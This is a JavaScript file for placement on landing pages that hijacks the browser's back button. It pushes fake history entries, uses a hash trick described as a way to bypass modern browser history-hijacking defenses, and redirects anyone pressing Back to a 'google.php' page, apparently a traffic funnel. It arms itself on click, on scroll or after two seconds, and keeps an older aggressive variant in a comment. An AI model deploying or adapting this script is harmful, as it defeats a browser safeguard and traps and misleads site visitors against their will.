/**
 * Backfix & Exit-Intent Redirect Script (Ravelizio Version)
 * 
 * Place this script right before </body> on the landing page.
 * It intercepts the back button and exit intent, using three triggers
 * to bypass modern browser history hijacking defenses.
 */
(function() {
    var templateLang = '{{LANG}}';
    var langCode = templateLang;
    
    // If {{LANG}} wasn't replaced by generator, fallback to URL inspection
    if (templateLang === '{{' + 'LANG}}') {
        var pathParts = window.location.pathname.split('/');
        var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
        langCode = inSubdir ? pathParts[pathParts.length - 2] : 'en';
    }

    // Build target search parameters
    var searchParams = new URLSearchParams(window.location.search);
    searchParams.set('lang', langCode);

    // Determine path to central google.php - only redirect if we came from a subdir
    var currentPath = window.location.pathname;
    var pathParts = currentPath.split('/');
    var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
    
    // Set redirect target for both subdirectory and root page structures
    var targetUrl = inSubdir ? "../google.php?" + searchParams.toString() : "google.php?" + searchParams.toString();
    
    var activated = false;

    // Activation logic: pushes history states and binds popstate listener
    function activateBackBlock() {
        if (activated) return;
        activated = true;
        console.log("[Backfix] Скрипт активирован! Записываем историю...");

        if (!targetUrl) {
            console.log("[Backfix] Ошибка: targetUrl пустой!");
            return;
        }

        /* --- OLD 15-LOOP VERSION (for rollback):
        for (var i = 0; i < 15; i++) {
            history.pushState(null, document.title, location.href);
        }
        window.addEventListener('popstate', function() {
            history.pushState(null, document.title, location.href);
            setTimeout(function() {
                location.replace(targetUrl);
            }, 0);
        });
        ------------------------------------------ */

        // NEW Ravelizio 2-state Pattern with Hash Bypass
        try {
            history.pushState({backfixed: 1}, "", location.href);
            history.pushState({backfixed: 2}, "", location.href + "#back");
            console.log("[Backfix] История с хэшем успешно записана. Ждем 'Назад'. Target: " + targetUrl);
        } catch (e) {
            console.log("[Backfix] Ошибка pushState: ", e);
        }

        window.addEventListener('popstate', function(event) {
            console.log("[Backfix] Событие popstate (кнопка Назад нажата) перехвачено!");
            console.log("[Backfix] Перенаправляем на: " + targetUrl);
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 50);
        });
    }

    // Activate on user interaction
    try {
        activateBackBlock();
    } catch(e) {}

    // --- Activation Triggers (Ravelizio Pattern) ---
    // 1. User clicks anywhere
    document.addEventListener('click', activateBackBlock, { once: true });
    
    // 2. User scrolls down > 10px
    window.addEventListener('scroll', function() {
        if (window.scrollY > 10) {
            activateBackBlock();
        }
    }, { once: true });

    // 3. Timeout: trigger after 2 seconds anyway
    setTimeout(activateBackBlock, 2000);

    // No automatic exit-intent redirect: only intercept browser back navigation.
})();
